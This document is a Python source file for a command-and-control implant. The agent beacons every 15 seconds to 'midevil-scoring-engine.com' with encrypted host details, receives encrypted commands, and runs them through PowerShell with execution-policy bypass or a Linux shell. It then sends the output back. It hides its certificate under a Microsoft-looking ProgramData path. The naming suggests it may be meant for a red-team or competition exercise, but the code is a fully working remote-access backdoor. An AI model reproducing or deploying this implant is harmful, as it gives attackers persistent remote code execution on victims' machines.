import requests
import subprocess
import time
import platform
import json
from cryptography.fernet import Fernet

# Encryption setup
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)

# Failover list
C2_DOMAINS = ["https://midevil-scoring-engine.com"]

# Path to self-signed cert
CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"

def get_system_info():
    """Gathers system metadata for the dashboard asset inventory."""
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "status": "Online"
    }
    return json.dumps(info)

def run_agent():
    my_hostname = platform.node()
    current_os = platform.system()
    print(f"[*] Agent [{my_hostname}] initialized on {current_os}. Beginning beaconing...")
    
    while True:
        success = False
        for url in C2_DOMAINS:
            try:
                # 1. Prepare Heartbeat
                raw_info = get_system_info()
                encrypted_heartbeat = cipher.encrypt(raw_info.encode())

                # 2. Beacon Out (Check-in)
                response = requests.post(
                    f"{url}/checkin", 
                    data=encrypted_heartbeat, 
                    timeout=10,
                    verify=CERT_PATH
                )

                if response.status_code == 200:
                    success = True
                    encrypted_command = response.content
                    command = cipher.decrypt(encrypted_command).decode()

                    if command and command.lower() != "none":
                        print(f"[*] Executing: {command}")
                        
                        # --- ENHANCED EXECUTION LOGIC ---
                        if current_os == "Windows":
                            # Use PowerShell with Bypass for full flexibility
                            full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
                            raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
                        else:
                            # Standard Linux execution
                            raw_result = subprocess.getoutput(command)
                        # --------------------------------
                        
                        # 3. Format Result
                        formatted_result = f"{my_hostname}|{raw_result}"
                        encrypted_result = cipher.encrypt(formatted_result.encode())
                        
                        # Send result back
                        requests.post(
                            f"{url}/result", 
                            data=encrypted_result, 
                            verify=CERT_PATH,
                            timeout=10
                        )
                        print("[+] Result transmitted.")
                    
                    break 

            except Exception as e:
                # Fallback for empty results/errors so the dashboard doesn't hang
                error_msg = f"{my_hostname}|Error executing command: {str(e)}"
                try:
                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=CERT_PATH, timeout=5)
                except: pass
                print(f"[!] Connection failed for {url}: {e}")
                continue 
        
        wait_time = 15
        print(f"[*] Beacon interval complete. Sleeping {wait_time}s...")
        time.sleep(wait_time)

if __name__ == "__main__":
    run_agent()